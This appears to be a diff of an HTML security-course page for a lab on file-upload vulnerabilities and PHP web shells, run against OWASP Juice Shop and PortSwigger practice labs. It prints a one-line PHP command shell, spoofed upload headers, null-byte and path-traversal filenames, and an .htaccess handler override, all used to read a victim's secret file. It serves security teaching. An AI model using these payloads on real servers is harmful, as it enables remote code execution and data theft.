@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Lab 06: File Upload to Web Shell &amp; Command Injection — CCY4202</title>
+  <title>Lab 06: File Upload Vulnerabilities &amp; Web Shells — CCY4202</title>
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700;800&display=swap" rel="stylesheet" />
@@ -35,15 +35,15 @@
       </nav>
 
       <header class="lab-header">
-        <h1 class="lab-header__title">Lab 06: File Upload to Web Shell &amp; Command Injection</h1>
+        <h1 class="lab-header__title">Lab 06: File Upload Vulnerabilities &amp; Web Shells</h1>
         <p class="lab-header__lead">
-          Every lab so far stayed inside the application: the database, the browser, another user's cart. Today you break out to the operating system. You'll discover exposed misconfigurations, slip a PHP script past upload filters, and chain OS commands so the server executes your code as the web server user (such as <code>www-data</code>).
+          Every lab so far stayed inside the application: the database, the browser, another user's cart. Today an uploaded file breaks out onto the operating system. You'll deploy a PHP web shell, defeat six progressively harder upload and path defenses, and see how a single URL-decoding gap lets you pull protected files off disk.
         </p>
       </header>
 
       <!-- Section 1: Static Serving vs Server-Side Execution -->
       <section>
-        <h2 id="what-webshell-is">1. How a Web Request Becomes an OS Shell</h2>
+        <h2 id="what-webshell-is">1. How an Uploaded File Becomes an OS Shell</h2>
 
         <div class="callout callout--tip">
           <span class="callout__icon">🔥</span>
@@ -53,7 +53,7 @@
               In May 2017, attackers hit Equifax's consumer dispute portal through an Apache Struts flaw (<code>CVE-2017-5638</code>, CVSS 10.0) where a crafted HTTP <code>Content-Type</code> header got parsed as OGNL code and executed OS commands on the server. They dropped web shells to hold access and moved across internal networks for <strong>76 days</strong> before detection, exposing Social Security numbers and personal data for roughly <strong>147 million people</strong>.
             </p>
             <p style="margin:0 0 var(--space-2);font-size:var(--font-size-sm);color:var(--color-text-secondary);">
-              The patch had been out since March 7, 2017. That whole breach began the way today's lab does: an HTTP request that the web server ran as code instead of treating as data.
+              The patch had been out since March 7, 2017. That whole breach relied on the exact foothold you build today: getting a web server to execute attacker-supplied code on the host OS.
             </p>
             <p style="margin:0;font-size:var(--font-size-xs);color:var(--color-text-muted);">
               Source: <a href="https://www.govinfo.gov/app/details/GOVPUB-Y4_G74_7-PURL-gpo191321" target="_blank" rel="noopener noreferrer" style="color:var(--color-cyan);text-decoration:underline;">U.S. House Committee on Oversight and Government Reform: The Equifax Data Breach (Dec 2018) ↗</a>
@@ -179,138 +179,18 @@
         </div>
       </section>
 
-      <!-- Section 2: Security Misconfiguration & Poison Null Byte on Juice Shop -->
+      <!-- Section 2: Unrestricted Upload: Deploy Your First PHP Web Shell -->
       <section>
-        <h2 id="misconfig-recon">2. Security Misconfiguration &amp; Poison Null Byte</h2>
+        <h2 id="webshell-upload">2. Unrestricted Upload: Deploy Your First PHP Web Shell</h2>
         <p class="lab-lead">
-          Before uploading anything, attackers enumerate what the server already left exposed by mistake. Unprotected directories, verbose endpoints, and naive extension checks fall under <strong>Security Misconfiguration</strong> (OWASP A02). Let's inspect what OWASP Juice Shop leaves open out of the box.
-        </p>
-
-        <div class="target-launcher" data-target-slug="juice-shop">
-          <div class="target-launcher__header">
-            <div class="target-launcher__title-group">
-              <span class="target-launcher__icon">🧃</span>
-              <div>
-                <h3 class="target-launcher__title" id="target-juice-shop-card">OWASP Juice Shop</h3>
-                <div class="target-launcher__platform">Same container as Labs 02–05. Skip the docker command if it's already running.</div>
-              </div>
-            </div>
-          </div>
-          <div class="target-launcher__body">
-            <div class="target-launcher__step">
-              <span class="target-launcher__step-label">Start the container (skip if already running)</span>
-              <div class="terminal-window" style="margin:var(--space-1) 0 0;">
-                <div class="terminal-window__header"><span class="terminal-window__title">bash · start Juice Shop</span></div>
-                <div class="terminal-window__body"><pre><code>docker run --rm -d --name juice -p 3000:3000 bkimminich/juice-shop</code></pre></div>
-              </div>
-            </div>
-            <div class="target-launcher__step">
-              <span class="target-launcher__step-label">Target base URL</span>
-              <a class="target-launcher__url" href="http://localhost:3000" target="_blank" rel="noopener">http://localhost:3000</a>
-            </div>
-          </div>
-          <div class="target-launcher__footer">
-            <span>Run these checks with <code>curl</code> in your terminal or open the URLs in your browser.</span>
-            <a class="target-launcher__catalog-link" href="../tools.html#juice-shop">→ setup card</a>
-          </div>
-        </div>
-
-        <div class="bento-card" style="margin-top:var(--space-4);">
-          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--space-2);">
-            <strong style="color:var(--color-cyan);font-family:var(--font-mono);font-size:var(--font-size-sm);">Step 1 · Discover the Exposed <code>/ftp</code> Directory &amp; Probe the Filter</strong>
-            <span class="comparison-badge" style="color:var(--color-cyan);">Recon → Identify</span>
-          </div>
-          <ol style="font-size:var(--font-size-sm);color:var(--color-text-secondary);padding-left:var(--space-4);margin:0 0 var(--space-3);display:flex;flex-direction:column;gap:var(--space-2);">
-            <li><strong>Find the hidden folder without guessing</strong>: Just like real assessments, start with <code>robots.txt</code> (or inspect the link to <code>/ftp/legal.md</code> on the About Us page). Run:
-              <div class="terminal-window" style="margin:var(--space-1) 0 0;">
-                <div class="terminal-window__header"><span class="terminal-window__title">bash · check robots.txt and list /ftp</span></div>
-                <div class="terminal-window__body"><pre><code>curl -s http://localhost:3000/robots.txt
-curl -s http://localhost:3000/ftp | grep -oE 'href="[^"]+"'</code></pre></div>
-              </div>
-            </li>
-            <li><code>robots.txt</code> prints <code>Disallow: /ftp</code>, and requesting <code>/ftp</code> returns a full directory listing containing backup files nobody meant to publish (<code>package.json.bak</code>, <code>coupons_2013.md.bak</code>, <code>suspicious_errors.yml</code>, <code>incident-support.kdbx</code>).</li>
-            <li><strong>Test the download rule</strong>: <code>curl -s http://localhost:3000/ftp/legal.md | head -3</code> downloads cleanly (<code>200 OK</code>), while requesting <code>package.json.bak</code> hits a <code>403 Forbidden</code> wall:
-              <div class="terminal-window" style="margin:var(--space-1) 0 0;">
-                <div class="terminal-window__header"><span class="terminal-window__title">bash · confirm the 403 extension check</span></div>
-                <div class="terminal-window__body"><pre><code>curl -i http://localhost:3000/ftp/package.json.bak</code></pre></div>
-              </div>
-            </li>
-          </ol>
-          <div class="terminal-window" data-no-copy style="margin:0;">
-            <div class="terminal-window__header"><span class="terminal-window__title">Output · 403 error leaks the exact allowlist</span></div>
-            <div class="terminal-window__body"><pre><code>HTTP/1.1 403 Forbidden
-...
-Error: Only .md and .pdf files are allowed!</code></pre></div>
-          </div>
-        </div>
-
-        <div class="prediction-prompt" style="margin-top:var(--space-4);">
-          <div class="prediction-prompt__question">🤔 The server's verbose error told you the exact rule: the filename must end in <code>.md</code> or <code>.pdf</code>. You want <code>package.json.bak</code>. How can a single filename string end in <code>.md</code> when the filter checks it, yet resolve to <code>package.json.bak</code> when the file is opened?</div>
-          <div class="prediction-prompt__input-group">
-            <input type="text" class="prediction-prompt__input" placeholder="Your guess…" />
-            <button type="button" class="prediction-prompt__btn">Reveal</button>
-          </div>
-          <div class="prediction-prompt__reveal" hidden>
-            <span class="prediction-prompt__reveal-label">Answer</span>
-            <p style="margin:0;">A <strong>poison null byte</strong> (<code>%2500</code>). The filter checks whether the string ends in <code>.md</code> first, then a helper function truncates everything from the null byte onward before opening the file on disk. Sending <code>package.json.bak%2500.md</code> makes the filter see <code>.md</code> while the file handler opens <code>package.json.bak</code>.</p>
-          </div>
-        </div>
-
-        <div class="bento-card" style="margin-top:var(--space-4);border-left:3px solid var(--color-accent);">
-          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--space-2);">
-            <strong style="color:var(--color-accent);font-family:var(--font-mono);font-size:var(--font-size-sm);">Step 2 · Bypass the Allowlist with Double-Encoded Null Byte (<code>%2500</code>)</strong>
-            <span class="comparison-badge" style="color:var(--color-accent);">Parser Split</span>
-          </div>
-          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:0 0 var(--space-2);">
-            Look at why double-encoding (<code>%2500</code> instead of <code>%00</code>) is required in Juice Shop's actual backend code (<code>routes/fileServer.ts</code> and <code>lib/insecurity.ts</code>):
-          </p>
-          <div class="terminal-window" data-no-copy style="margin:0 0 var(--space-3);">
-            <div class="terminal-window__header"><span class="terminal-window__title">Juice Shop source (routes/fileServer.ts &amp; lib/insecurity.ts) · why %2500 works</span></div>
-            <div class="terminal-window__body"><pre><code>// 1. Express URL-decodes params.file ONCE on arrival:
-//    "package.json.bak%2500.md"  --&gt;  "package.json.bak%00.md"  (%25 becomes %)
-//    (If you sent raw %00, Express decodes it to \x00 and Node rejects the path.)
-
-// 2. routes/fileServer.ts checks the ending BEFORE stripping the null byte:
-if (file &amp;&amp; (endsWithAllowlistedFileType(file) || (file === 'incident-support.kdbx'))) {
-  file = security.cutOffPoisonNullByte(file) // looks for literal '%00', cuts off '%00.md'
-  res.sendFile(path.resolve('ftp/', file))   // opens ftp/package.json.bak!
-}</code></pre></div>
-          </div>
-          <div class="terminal-window" style="margin:0 0 var(--space-2);">
-            <div class="terminal-window__header"><span class="terminal-window__title">bash · retrieve the 403-blocked backup file</span></div>
-            <div class="terminal-window__body"><pre><code>curl -s "http://localhost:3000/ftp/package.json.bak%2500.md" | head -n 6</code></pre></div>
-          </div>
-          <div class="terminal-window" data-no-copy style="margin:0;">
-            <div class="terminal-window__header"><span class="terminal-window__title">Output · 200 OK serving package.json.bak</span></div>
-            <div class="terminal-window__body"><pre><code>{
-  "name": "juice-shop",
-  "version": "6.2.0-SNAPSHOT",
-  "description": "An intentionally insecure JavaScript Web Application",
-  "homepage": "http://owasp-juice.shop",
-  "author": "Björn Kimminich &lt;bjoern.kimminich@owasp.org&gt; (https://kimminich.de)",</code></pre></div>
-          </div>
-          <details class="thought-accordion" style="margin-top:var(--space-3);">
-            <summary>Other endpoints Juice Shop leaves open (and a quick header check)</summary>
-            <div class="thought-accordion__content">
-              <p style="margin:0 0 var(--space-2);">Check these without logging in: <code>GET /metrics</code> (full Prometheus server telemetry), <code>GET /rest/admin/application-configuration</code> (the application's configuration JSON), and <code>curl -I http://localhost:3000</code> (notice there's no <code>Content-Security-Policy</code> header, which is why Lab 04's inline XSS had nothing standing in its way).</p>
-              <p style="margin:0;">Also try <code>http://localhost:3000/ftp/package.json.bak%2500.md</code> directly in your browser. Just like Lab 05's JSON parameter pollution, the bug comes from validating one version of the string and acting on a mutated version afterward.</p>
-            </div>
-          </details>
-        </div>
-      </section>
-
-      <!-- Section 3: Upload a PHP Web Shell & Run OS Commands -->
-      <section>
-        <h2 id="webshell-upload">3. Upload a PHP Web Shell &amp; Execute OS Commands</h2>
-        <p class="lab-lead">
-          Reading a leaked backup file is misconfiguration. Next is getting code execution on the server itself. You'll upload a one-line PHP file through a user avatar form, request it over HTTP, and watch the server run your commands.
+          Let's prove that execution path live. On a server with zero upload validation, dropping a one-line PHP file into an avatar form gives you immediate Remote Code Execution (RCE).
         </p>
 
         <div class="callout callout--tip" style="margin-top:var(--space-2);">
-          <span class="callout__icon">🧃</span>
+          <span class="callout__icon">🎓</span>
           <div class="callout__content">
-            <div class="callout__title">Why we switch targets here: Juice Shop runs Node.js, not PHP</div>
-            <p style="margin:0;">Juice Shop is a Node/Express app with no PHP interpreter, so dropping a <code>.php</code> file onto it won't execute anything. (Its upload bugs target Node XML/ZIP parsers via XXE and Zip Slip.) To run a real PHP web shell against Apache, we use PortSwigger's free Apache/PHP containers for Sections 3–5.</p>
+            <div class="callout__title">Target Choice: PortSwigger Apache/PHP First, Juice Shop Later</div>
+            <p style="margin:0;">Juice Shop runs on Node.js with no PHP interpreter, so a <code>.php</code> file uploaded there won't execute. We start on PortSwigger's free Apache/PHP containers for Sections 2–4 to master upload bypasses, then switch back to Juice Shop in Section 5 to see why URL-path filters decode differently from upload headers.</p>
           </div>
         </div>
 
@@ -331,14 +211,14 @@ if (file &amp;&amp; (endsWithAllowlistedFileType(file) || (file === 'incident-su
             </div>
           </div>
           <div class="target-launcher__footer">
-            <span>Proxy your browser through Burp Suite (<code>127.0.0.1:8080</code>) so the upload and avatar fetch land in Proxy → HTTP history.</span>
+            <span>Proxy your browser through Burp Suite (<code>127.0.0.1:8080</code>) so uploads and avatar fetches land in Proxy → HTTP history.</span>
             <a class="target-launcher__catalog-link" href="../tools.html#portswigger">→ platform card</a>
           </div>
         </div>
 
         <div class="bento-card" style="margin-top:var(--space-4);">
           <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--space-2);">
-            <strong style="color:var(--color-accent);font-family:var(--font-mono);font-size:var(--font-size-sm);">Step 3 · Upload <code>exploit.php</code> and Run OS Commands</strong>
+            <strong style="color:var(--color-accent);font-family:var(--font-mono);font-size:var(--font-size-sm);">Step 1 · Upload <code>exploit.php</code> and Run OS Commands</strong>
             <span class="comparison-badge" style="color:var(--color-accent);">Unrestricted Upload → RCE</span>
           </div>
           <ol style="font-size:var(--font-size-sm);color:var(--color-text-secondary);padding-left:var(--space-4);margin:0 0 var(--space-3);display:flex;flex-direction:column;gap:var(--space-2);">
@@ -348,8 +228,8 @@ if (file &amp;&amp; (endsWithAllowlistedFileType(file) || (file === 'incident-su
                 <div class="terminal-window__body"><pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre></div>
               </div>
             </li>
-            <li><strong>Upload it as your avatar</strong>: Log into the lab as <code>wiener</code> / <code>peter</code>, open <strong>My account</strong>, choose <code>exploit.php</code> in the avatar upload form, and submit. The server saves it under <code>/files/avatars/exploit.php</code> with no validation at all.</li>
-            <li><strong>Execute OS commands via URL</strong>: Check Burp <strong>Proxy → HTTP history</strong> (make sure the <strong>Images</strong> MIME filter isn't hiding non-image paths, or open the broken avatar URL directly). Send <code>GET /files/avatars/exploit.php?cmd=id</code> to run <code>id</code>, then read Carlos's secret file to solve the lab:
+            <li><strong>Upload it as your avatar</strong>: Log into the lab as <code>wiener</code> / <code>peter</code>, open <strong>My account</strong>, choose <code>exploit.php</code> in the avatar upload form, and submit. The server saves it under <code>/files/avatars/exploit.php</code> with no checks at all.</li>
+            <li><strong>Execute OS commands via URL</strong>: Check Burp <strong>Proxy → HTTP history</strong> (make sure the <strong>Images</strong> MIME filter isn't hiding non-image paths, or open the broken avatar URL directly). Send <code>GET /files/avatars/exploit.php?cmd=id</code> to inspect your OS user, then read Carlos's secret file to solve the lab:
               <div class="terminal-window" style="margin:var(--space-1) 0 0;">
                 <div class="terminal-window__header"><span class="terminal-window__title">HTTP · trigger your uploaded shell</span></div>
                 <div class="terminal-window__body"><pre><code>GET /files/avatars/exploit.php?cmd=cat+/home/carlos/secret HTTP/1.1</code></pre></div>
@@ -388,17 +268,17 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)   # example Linux Apache o
         </div>
       </section>
 
-      <!-- Section 4: Bypassing Upload Filters -->
+      <!-- Section 3: Defeating Metadata Filters: Content-Type & Poison Null Bytes -->
       <section>
-        <h2 id="beat-the-filter">4. Bypassing Upload Filters: Content-Type, Extensions &amp; Magic Bytes</h2>
+        <h2 id="beat-the-filter">3. Defeating Metadata Filters: <code>Content-Type</code> &amp; Poison Null Bytes (<code>%00</code>)</h2>
         <p class="lab-lead">
-          Real upload endpoints usually block raw <code>.php</code> uploads, yet developers frequently validate the wrong property. Below are the three classic server checks and the exact parser discrepancy that bypasses each one.
+          Once developers realize users can upload <code>.php</code> scripts, their first fix is checking the HTTP upload metadata: the <code>Content-Type</code> header or the filename suffix. Both belong to the client, and both lie easily.
         </p>
 
         <!-- Lab 2: Content-Type Bypass -->
         <div class="bento-card" style="margin-top:var(--space-3);">
           <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--space-2);">
-            <strong style="color:var(--color-warn);font-family:var(--font-mono);font-size:var(--font-size-sm);">Step 4a · Spoof the <code>Content-Type</code> Header in Burp Repeater</strong>
+            <strong style="color:var(--color-warn);font-family:var(--font-mono);font-size:var(--font-size-sm);">Step 2a · Spoof the <code>Content-Type</code> Header in Burp Repeater</strong>
             <span class="comparison-badge" style="color:var(--color-warn);">MIME Header Bypass</span>
           </div>
           <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:0 0 var(--space-2);">
@@ -414,79 +294,451 @@ Content-Type: image/jpeg          # changed from application/x-php or applicatio
 ------WebKitFormBoundary7MA4YWxkTrZu0gW--</code></pre></div>
           </div>
           <p style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin:var(--space-2) 0 0;">
-            The server trusts the browser-supplied <code>Content-Type</code> header, accepts <code>exploit.php</code> onto disk, and Apache still executes it via <code>GET /files/avatars/exploit.php?cmd=cat+/home/carlos/secret</code> because the filename ends in <code>.php</code>.
+            The server trusts the browser-supplied <code>Content-Type</code> header, saves <code>exploit.php</code> onto disk, and Apache executes it via <code>GET /files/avatars/exploit.php?cmd=cat+/home/carlos/secret</code> because the filename ends in <code>.php</code>.
           </p>
         </div>
 
-        <!-- Lab 3: Extension Blacklist + Null Byte -->
-        <div class="prediction-prompt" style="margin-top:var(--space-4);">
-          <div class="prediction-prompt__question">🤔 Now the server stops trusting <code>Content-Type</code> and checks the filename extension instead, rejecting anything that isn't JPG or PNG. Using the null-byte trick from Section 2, what <code>filename</code> in Burp's <code>Content-Disposition</code> header satisfies the <code>.jpg</code> check while saving as <code>exploit.php</code>?</div>
+        <!-- Teach Poison Null Byte BEFORE the prediction prompt -->
+        <h3 id="null-byte-concept" style="margin-top:var(--space-4);">What If the Filter Checks the Filename Extension Instead?</h3>
+        <p class="lab-lead">
+          When a server ignores <code>Content-Type</code> and checks the filename ending, a single string needs to end in <code>.jpg</code> at the filter and end in <code>.php</code> on disk. In C-style file APIs and URL-decoded paths, the <strong>Null Byte</strong> (hex <code>0x00</code>, URL-encoded as <code>%00</code>) means <strong>"stop reading the string here."</strong>
+        </p>
+
+        <div class="comparison-grid" style="margin:var(--space-3) 0 var(--space-4);">
+          <div class="comparison-card comparison-card--cyan">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title" id="null-byte-filter-card">1. High-Level Suffix Filter</h3>
+              <span class="comparison-badge" style="color:var(--color-cyan);">Reads Full String</span>
+            </div>
+            <div class="terminal-window" data-no-copy style="margin:var(--space-2) 0;">
+              <div class="terminal-window__body"><pre><code>filename = "exploit.php%00.jpg"
+→ checks ending of string: ".jpg"
+→ Result: ALLOWED ✅</code></pre></div>
+            </div>
+            <p style="font-size:var(--font-size-xs);color:var(--color-text-secondary);margin:0;">
+              High-level validation checks whether the filename ends with an image extension (<code>.jpg</code> or <code>.png</code>) before decoding special bytes.
+            </p>
+          </div>
+          <div class="comparison-card comparison-card--accent">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title" id="null-byte-disk-card">2. Low-Level File Save Handler</h3>
+              <span class="comparison-badge" style="color:var(--color-accent);">Stops at 0x00</span>
+            </div>
+            <div class="terminal-window" data-no-copy style="margin:var(--space-2) 0;">
+              <div class="terminal-window__body"><pre><code>decodes %00 → \x00 (null terminator)
+→ reads left-to-right: "exploit.php\x00.jpg"
+→ drops ".jpg", writes "exploit.php" 💥</code></pre></div>
+            </div>
+            <p style="font-size:var(--font-size-xs);color:var(--color-text-secondary);margin:0;">
+              When the backend decodes <code>%00</code> while writing to disk, everything after the null byte vanishes and Apache receives an executable <code>.php</code> file.
+            </p>
+          </div>
+        </div>
+
+        <div class="prediction-prompt" style="margin-top:var(--space-3);">
+          <div class="prediction-prompt__question">🤔 Now the upload endpoint rejects anything whose filename doesn't end in JPG or PNG. Using the null-byte terminator you just saw, what exact <code>filename</code> in Burp's <code>Content-Disposition</code> header satisfies the <code>.jpg</code> check while saving as <code>exploit.php</code>?</div>
           <div class="prediction-prompt__input-group">
             <input type="text" class="prediction-prompt__input" placeholder="exploit.php..." />
             <button type="button" class="prediction-prompt__btn">Reveal</button>
           </div>
           <div class="prediction-prompt__reveal" hidden>
             <span class="prediction-prompt__reveal-label">Answer</span>
-            <p style="margin:0;"><code>exploit.php%00.jpg</code>. Notice why single <code>%00</code> works inside <code>multipart/form-data</code> here whereas Juice Shop's URL path needed <code>%2500</code>: an HTTP header parameter isn't pre-decoded by an Express URL router before the upload handler reads it, so the lab's upload parser inspects <code>.jpg</code> first and then URL-decodes/truncates at <code>%00</code> when saving to disk.</p>
+            <p style="margin:0;"><code>exploit.php%00.jpg</code>. The upload validator sees <code>.jpg</code> at the end, then the save routine decodes <code>%00</code> and truncates the rest, writing <code>exploit.php</code> on disk.</p>
           </div>
         </div>
 
+        <!-- Lab 3: Obfuscated Extension + Null Byte -->
         <div class="bento-card" style="margin-top:var(--space-3);border-left:3px solid var(--color-accent);">
           <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--space-2);">
-            <strong style="color:var(--color-accent);font-family:var(--font-mono);font-size:var(--font-size-sm);">Step 4b · Null-Byte Obfuscation &amp; Overlooked Extensions</strong>
+            <strong style="color:var(--color-accent);font-family:var(--font-mono);font-size:var(--font-size-sm);">Step 2b · Bypass Extension Validation with <code>%00</code></strong>
             <span class="comparison-badge" style="color:var(--color-accent);">Extension Bypass</span>
           </div>
           <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:0 0 var(--space-2);">
             Open PortSwigger's third lab: <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension" target="_blank" rel="noopener noreferrer" style="color:var(--color-cyan);text-decoration:underline;">Lab: Web shell upload via obfuscated file extension ↗</a>. Upload <code>exploit.php</code>, catch the blocked <code>POST /my-account/avatar</code> in Burp Repeater, and rewrite the filename:
           </p>
           <div class="terminal-window" data-no-copy style="margin:0 0 var(--space-2);">
-            <div class="terminal-window__header"><span class="terminal-window__title">Burp Repeater · null-byte truncation in Content-Disposition</span></div>
+            <div class="terminal-window__header"><span class="terminal-window__title">Burp Repeater · single %00 works inside multipart headers</span></div>
             <div class="terminal-window__body"><pre><code>Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
 Content-Type: application/x-php</code></pre></div>
           </div>
           <p style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin:0;">
-            The upload confirmation says <code>exploit.php</code> was uploaded (confirming truncation at <code>%00</code>). Request <code>GET /files/avatars/exploit.php?cmd=cat+/home/carlos/secret</code> to solve it. On servers that block <code>.php</code> with a naive blacklist instead of an allowlist, pentesters also test secondary PHP extensions (<code>.phtml</code>, <code>.phar</code>, <code>.php5</code>, <code>.pHp</code>) or overwrite server rules via <code>.htaccess</code>.
+            Notice the confirmation says <code>exploit.php</code> was uploaded (proving truncation at <code>%00</code>). Request <code>GET /files/avatars/exploit.php?cmd=cat+/home/carlos/secret</code> to solve it. Keep a mental note that single <code>%00</code> worked here because it sat inside a <code>multipart/form-data</code> body header; in Section 5 you'll see what happens when you try single <code>%00</code> inside a URL path instead.
           </p>
         </div>
+      </section>
 
-        <!-- Magic Byte Polyglots -->
-        <h3 id="magic-bytes-polyglot" style="margin-top:var(--space-4);">What if the Server Checks the File Bytes (Magic Bytes)?</h3>
+      <!-- Section 4: Advanced Defenses: Non-Executable Folders, .htaccess & Image Polyglots -->
+      <section>
+        <h2 id="advanced-upload-bypasses">4. Advanced Defenses: Non-Executable Folders, <code>.htaccess</code> &amp; Image Polyglots</h2>
         <p class="lab-lead">
-          Harder upload forms ignore both <code>Content-Type</code> and the filename, and inspect the first bytes of the file using functions like PHP's <code>exif_imagetype()</code> or <code>finfo_file()</code>. A plain text file starting with <code>&lt;?php</code> gets rejected immediately.
+          Harder targets don't stop at checking <code>Content-Type</code> or the filename suffix. They disable script execution inside the upload folder, blacklist PHP extensions altogether, or parse the uploaded bytes to verify a real image. Each defense still breaks if one assumption fails.
         </p>
-        <div class="comparison-grid" style="margin-bottom:var(--space-4);">
+
+        <!-- Step 3a: Lab 4 Path Traversal -->
+        <div class="bento-card" style="margin-top:var(--space-3);">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--space-2);">
+            <strong style="color:var(--color-cyan);font-family:var(--font-mono);font-size:var(--font-size-sm);">Step 3a · Escape a Non-Executable Folder via Path Traversal (<code>..%2f</code>)</strong>
+            <span class="comparison-badge" style="color:var(--color-cyan);">Folder Escape</span>
+          </div>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:0 0 var(--space-2);">
+            Open PortSwigger's fourth lab: <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal" target="_blank" rel="noopener noreferrer" style="color:var(--color-cyan);text-decoration:underline;">Lab: Web shell upload via path traversal ↗</a>. Upload <code>exploit.php</code> and request <code>GET /files/avatars/exploit.php</code>: the server returns your raw PHP source code as plain text instead of running it, because PHP execution is disabled inside <code>/files/avatars/</code>.
+          </p>
+          <ol style="font-size:var(--font-size-sm);color:var(--color-text-secondary);padding-left:var(--space-4);margin:0 0 var(--space-2);display:flex;flex-direction:column;gap:var(--space-2);">
+            <li><strong>Test raw traversal</strong>: In Burp Repeater on <code>POST /my-account/avatar</code>, set <code>filename="../exploit.php"</code>. The response says <code>The file avatars/exploit.php has been uploaded</code>, proving the app stripped the literal <code>../</code> prefix.</li>
+            <li><strong>Obfuscate the slash</strong>: URL-encode <code>/</code> as <code>%2f</code> so the prefix filter misses it while the filesystem still resolves the parent directory:
+              <div class="terminal-window" data-no-copy style="margin:var(--space-1) 0 0;">
+                <div class="terminal-window__header"><span class="terminal-window__title">Burp Repeater · climb out of /files/avatars/ into /files/</span></div>
+                <div class="terminal-window__body"><pre><code>Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
+Content-Type: application/x-php
+
+&lt;?php system($_GET['cmd']); ?&gt;</code></pre></div>
+              </div>
+            </li>
+            <li>The response confirms <code>The file avatars/../exploit.php has been uploaded</code>. Request <code>GET /files/exploit.php?cmd=cat+/home/carlos/secret</code> (one folder up, where PHP execution is still enabled) to solve the lab.</li>
+          </ol>
+        </div>
+
+        <!-- Step 3b: Lab 5 .htaccess Blacklist Bypass -->
+        <div class="bento-card" style="margin-top:var(--space-4);border-left:3px solid var(--color-warn);">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--space-2);">
+            <strong style="color:var(--color-warn);font-family:var(--font-mono);font-size:var(--font-size-sm);">Step 3b · Defeat a <code>.php</code> Blacklist via Two-Stage <code>.htaccess</code> Upload</strong>
+            <span class="comparison-badge" style="color:var(--color-warn);">Config Override</span>
+          </div>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:0 0 var(--space-2);">
+            Open PortSwigger's fifth lab: <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass" target="_blank" rel="noopener noreferrer" style="color:var(--color-cyan);text-decoration:underline;">Lab: Web shell upload via extension blacklist bypass ↗</a>. Uploading <code>exploit.php</code> fails outright, and the HTTP response headers show an <strong>Apache</strong> server. If a blacklist blocks <code>.php</code> (plus common variants like <code>.php5</code>, <code>.phtml</code>, <code>.phar</code>) but forgets server config files, you can teach Apache to execute a custom extension instead:
+          </p>
+          <ol style="font-size:var(--font-size-sm);color:var(--color-text-secondary);padding-left:var(--space-4);margin:0 0 var(--space-2);display:flex;flex-direction:column;gap:var(--space-2);">
+            <li><strong>Stage 1 · Upload a directory config override</strong>: Send <code>POST /my-account/avatar</code> to Burp Repeater, set <code>filename=".htaccess"</code> and <code>Content-Type: text/plain</code>, and map <code>.l33t</code> to Apache's PHP handler:
+              <div class="terminal-window" data-no-copy style="margin:var(--space-1) 0 0;">
+                <div class="terminal-window__header"><span class="terminal-window__title">Burp Repeater · Upload #1 (.htaccess rules for /files/avatars/)</span></div>
+                <div class="terminal-window__body"><pre><code>Content-Disposition: form-data; name="avatar"; filename=".htaccess"
+Content-Type: text/plain
+
+AddType application/x-httpd-php .l33t</code></pre></div>
+              </div>
+            </li>
+            <li><strong>Stage 2 · Upload your shell under the new extension</strong>: Use the back arrow in Repeater, change <code>filename="exploit.php"</code> to <code>filename="exploit.l33t"</code> containing <code>&lt;?php system($_GET['cmd']); ?&gt;</code>, and send it.</li>
+            <li>Request <code>GET /files/avatars/exploit.l33t?cmd=cat+/home/carlos/secret</code>. Because of your <code>.htaccess</code> file, Apache runs <code>.l33t</code> through PHP and prints the secret.</li>
+          </ol>
+          <details class="thought-accordion" style="margin-top:var(--space-2);">
+            <summary>Other blacklist bypasses pentesters check before .htaccess</summary>
+            <div class="thought-accordion__content">
+              <p style="margin:0;">Before rewriting server config, pentesters test overlooked PHP extensions (<code>.phtml</code>, <code>.phar</code>, <code>.php5</code>, <code>.phps</code>), mixed case (<code>.pHp</code>), trailing dots/spaces on Windows IIS hosts, or double extensions (<code>exploit.php.jpg</code> when Apache's legacy <code>AddHandler</code> matches anywhere in the name). On IIS servers, uploading <code>web.config</code> serves the same role as <code>.htaccess</code>.</p>
+            </div>
+          </details>
+        </div>
+
+        <!-- Step 3c: Lab 6 Content Validation & Polyglots -->
+        <h3 id="magic-bytes-polyglot" style="margin-top:var(--space-4);">Step 3c · What If the Server Checks the Actual File Contents?</h3>
+        <p class="lab-lead">
+          When an upload endpoint inspects the binary bytes of your upload instead of just the filename or headers, a plain text file starting with <code>&lt;?php</code> gets rejected. You bypass content checks with a <strong>polyglot</strong>: one file that is valid as both an image and a PHP script at the same time.
+        </p>
+
+        <div class="comparison-grid" style="margin-bottom:var(--space-3);">
           <div class="comparison-card comparison-card--cyan">
             <div class="comparison-card__header">
-              <h3 class="comparison-card__title" id="magic-byte-check">How Magic-Byte Checks Read Files</h3>
+              <h3 class="comparison-card__title" id="magic-byte-check">Quick Bypass: Magic-Byte Checks</h3>
